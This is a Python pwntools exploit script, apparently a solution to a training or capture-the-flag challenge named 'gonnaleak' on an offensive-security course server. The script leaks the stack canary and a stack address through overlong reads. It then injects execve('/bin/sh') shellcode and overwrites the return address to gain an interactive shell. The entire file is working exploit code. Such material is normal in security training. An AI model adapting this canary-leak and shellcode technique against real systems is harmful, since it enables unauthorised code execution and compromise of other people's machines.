from pwn import *
import time
from socket import htonl


context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./gonnaleak")
    gdb.attach(r, """
    b* 0x004011f7   
    """)

    input("wait")
else:
    r = remote("bin.training.offdef.it", 2010)

asm_code = """
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx
mov rdi, 0x4040a0
add rdi, 0x1a
syscall
"""

context.arch = 'amd64'
stringa = "/bin/sh"
shellcode = asm(asm_code)
res = shellcode + (b"/bin/sh")

print("1:", r.recv())
r.send(b"B"*105)
r.recvuntil(b"> ")
r.read(105)
leaked_canary = b"\x00" + r.read(7)
canary = u64(leaked_canary)
print("[!] leaked_canary %#x" % canary)

r.send(b"A"*120)
r.recvuntil(b"> ")
r.read(120)
leaked_address =  r.read(6) + b"\x00\x00"
addr = u64(leaked_address)
swapped = addr.to_bytes(8, byteorder='big')
print("leaked add %#x" %addr)

print("converted leaked %#d" %addr)
# addr = u64(swapped)
# print("converted swapped %#d" %addr)
# print("swapped add %#x" %addr)

myAddr = 140737350114704  #leaked in locale
mybuff = 140737488346738  #start of buffer in locale
stackOffset = myAddr - mybuff

# programOff = myAddr - addr
# trueOff = stackOffset + programOff
#print(trueOff)

whereToJump = addr-stackOffset
print("Where to jump %#x" %whereToJump)
wtj = whereToJump.to_bytes(8, byteorder='little')


payload = b"A"*104 + leaked_canary + b"B"*8 + wtj

r.send(payload)

#0x00007ffff7c29d90 leaked in locale
#0x00007fffffffde72 start of buffer in locale


time.sleep(0.1)

r.sendline(b"")

r.interactive()